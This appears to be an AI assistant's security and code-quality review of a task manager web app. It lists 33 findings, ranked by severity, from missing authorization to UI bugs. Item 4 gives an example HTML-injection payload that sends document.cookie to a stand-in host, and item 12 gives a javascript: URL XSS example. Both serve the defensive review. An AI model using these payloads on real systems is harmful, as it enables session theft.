Full Code Review — Task Manager
CRITICAL (fix immediately)
1. Missing authorization on destructive endpoints (IDOR)
Any logged-in user can delete/update ANY project or task in the system.

DELETE /projects/:id and PATCH /projects/:id — no membership or role check at all.
DELETE /tasks/:id — no project membership check. Compare to PATCH /tasks/:id which correctly calls requireProjectRole.
GET /projects/:id, GET /tasks/:id, GET /projects/:projectId/tasks — any authenticated user can read any project/task by guessing the CUID.
This is the single most dangerous class of bug in the codebase. An attacker who registers an account can enumerate and destroy every project.

2. Missing authorization on messages, comments, DMs, read receipts
Every messaging endpoint only checks authenticate, never project membership:

GET/POST /projects/:projectId/messages — read/post to any project chat
GET/POST /projects/:projectId/direct-messages/* — read anyone's DMs
GET/POST /tasks/:taskId/comments — read/post comments on any task
All read receipt endpoints — mark messages as read in projects you don't belong to
3. Any user can create invite codes for any project
POST /projects/:projectId/invites has no membership or role check. Any authenticated user can generate a valid invite link for any project and share it, granting access to strangers.

4. HTML injection in email templates
email.service.ts interpolates user-controlled strings (title, details, location, userName, taskUrl) directly into HTML without escaping. A schedule title like <img src=x onerror="fetch('https://evil.com/'+document.cookie)"> executes in every recipient's email client.

5. Auth handler race condition in app.ts

app.ts
Lines 66-74
  if (req.url.startsWith('/api/auth')) {
    injectCORSHeaders(req.raw, reply.raw)
    const handler = toNodeHandler(auth)
    await new Promise<void>((resolve) => {
      handler(req.raw, reply.raw)
      resolve()
    })
    return reply.hijack()
  }
resolve() fires synchronously — not after the handler finishes writing. reply.hijack() is called before the auth response is complete, causing potential dropped/partial responses. Should be handler(req.raw, reply.raw, () => resolve()) or similar.

HIGH (fix soon)
6. GitHub pending installation — any user can claim any installation
The pending store is global and unscoped. User A installs the GitHub App; User B polls /github/pending-installation and claims it. There's no user/session correlation.

7. GitHub connect/disconnect — no role check
Any project MEMBER can link or unlink a GitHub installation, overwriting the existing one via upsert. Should require MASTER_ADMIN or PROJECT_MANAGER.

8. Invite codes are reusable forever
POST /invites/:code/accept never checks if acceptedById is already set. Multiple different users can accept the same code. Once a link leaks, it's an open door until expiry.

9. Task deadline validation throws 500 instead of 400
In PATCH /tasks/:id, the deadline-in-the-past check uses throw new Error(...) instead of reply.status(400).send(...) like the POST handler. This leaks the stack trace to the client.

10. Notification markRead bypasses ownership
notification.service.ts uses where: { id, userId } as any. Prisma's update only accepts unique fields in where — userId is likely silently ignored, letting any user mark any notification as read.

11. Global 401 interceptor can cause redirect loops
api.ts redirects to /login on any 401. If the login page itself triggers a 401 (e.g., session check), you get an infinite redirect loop. This was likely the root cause of your earlier login issue.

12. githubPrUrl rendered as <a href> without URL validation
TaskDialog.tsx renders user-supplied githubPrUrl directly in an <a href>. A value like javascript:alert(1) would execute. No URL scheme validation exists on input or render.

13. TLS disabled on SMTP
email.service.ts sets secure: false and rejectUnauthorized: false. SMTP credentials are sent over an unverified connection, vulnerable to MITM.

MEDIUM (should fix)
14. Missing database indexes
The Prisma schema is missing critical indexes that will cause full table scans as data grows:

Task — no @@index([projectId]), no @@index([assigneeId])
TaskComment — no @@index([taskId])
ProjectMessage — no @@index([projectId, createdAt])
ProjectDirectMessage — no indexes at all
Notification — no @@index([userId, readAt])
15. No cascade deletes on project relations
Deleting a project will either fail with FK errors or leave orphaned tasks, comments, messages, DMs, invites, and members. The Task, TaskComment, ProjectMessage, ProjectDirectMessage, ProjectInvite models all lack onDelete: Cascade on their project relation.

16. Contribution heatmap counts all project activity, not just the user's
activity.service.ts contributionsForUser joins ActivityEvent with ProjectMember on projectId but never filters a.actorId = userId. Every team member's activity inflates your personal contribution count.

17. N+1 request waterfalls on Dashboard and Calendar
DashboardPage and usePendingDeadlines both fetch all projects, then fetch all tasks per project in parallel. For 20 projects, that's 21 HTTP requests on every page load. Should be a single backend endpoint.

18. ensureProjectHasStatus — read-modify-write race condition
Two concurrent requests adding different new statuses will both read the current board columns, then both write. The second write overwrites the first, losing a status.

19. Task dependency creation — no cycle detection, no duplicate check, no cross-project validation
You can create A blocks B, B blocks A (circular). You can create the same dependency twice (500 from unique constraint). You can link tasks across different projects.

20. Status change notification uses raw input instead of normalized value
tasks.ts compares body.status !== existing.status using the raw input. If a user sends "in_progress" (lowercase) and existing is "IN_PROGRESS", it triggers a spurious notification and the status label lookup fails.

21. @mention parsing is greedy and produces false positives
The regex /@([\w\s]+)/g matches whitespace, so @John went to the store becomes one mention. The substring matching means @a notifies every member whose name contains "a".

22. ProfilePage stale closures in GitHub auto-link effects
doAutoLink captures autoLinking and pollTimeoutId from the closure, but the useEffect dependency arrays omit them. This can trigger duplicate link attempts or miss state updates.

23. 90-second poll timeout leaks on unmount
ProfilePage sets a 90s setTimeout stored in state but never clears it on unmount. Navigating away causes setState calls on an unmounted component.

24. Background polling wastes resources
5+ hooks poll every 5 seconds (useReadReceipts, useProjectMessages, useProjectDirectMessages, useProjectDirectInbox) and none set refetchIntervalInBackground: false. Polling continues in background tabs.

LOW (nice to fix)
25. prisma.user calls cast to any in users.ts
All Prisma calls use as any, defeating type safety. Suggests status and lastSeenAt fields may be out of sync with the schema.

26. JWT secret not validated at startup
process.env.JWT_SECRET! silently passes undefined if unset. Same for GITHUB_APP_PRIVATE_KEY! which will crash with Cannot read properties of undefined (reading 'replace').

27. Invite code entropy is low
randomBytes(6) = 48 bits. While cryptographically random, this is low for a secret that grants project access. 16-32 bytes would be safer.

28. dashboardLayoutService silently swallows all errors
Both getOrCreateLayout and updateLayout catch and discard all errors, not just missing-table errors. DB connection failures are silently ignored.

29. Time log title field is validated but never stored
The Zod schema requires title, but only description is persisted as note. The title is silently discarded.

30. durationMinutes has no upper bound
A user could log Number.MAX_SAFE_INTEGER minutes, corrupting time reports.

31. ProjectActivityPage only shows today's logs
Title says "Project Logs" but it filters to today only with no date picker. Users will think historical logs are missing.

32. authClient baseURL derivation is fragile
.replace('/api', '') only replaces the first occurrence. A URL like https://api.example.com/api would produce https://example.com/ — stripping the wrong part.

33. useCreateTaskTimeLog doesn't invalidate task-level queries
After creating a time log, ['task-time-logs', taskId] is never invalidated. The TaskDialog time log list shows stale data.

Summary
Severity	Count	Theme
CRITICAL	5	Missing authorization on destructive ops, HTML injection, auth race condition
HIGH	8	GitHub security gaps, invite reuse, XSS vectors, 401 redirect loop
MEDIUM	11	Missing indexes, no cascades, N+1 queries, race conditions, stale closures
LOW	9	Type safety, validation gaps, UX issues, resource waste
The authorization gaps (items 1-3) are by far the most urgent. Right now, any registered user can read, modify, or delete any resource in the entire system. Everything else is secondary until those are locked down.

Want me to start fixing these? I'd recommend tackling the CRITICAL authorization issues first — I can add proper requireProjectRole checks to every affected endpoint in one pass.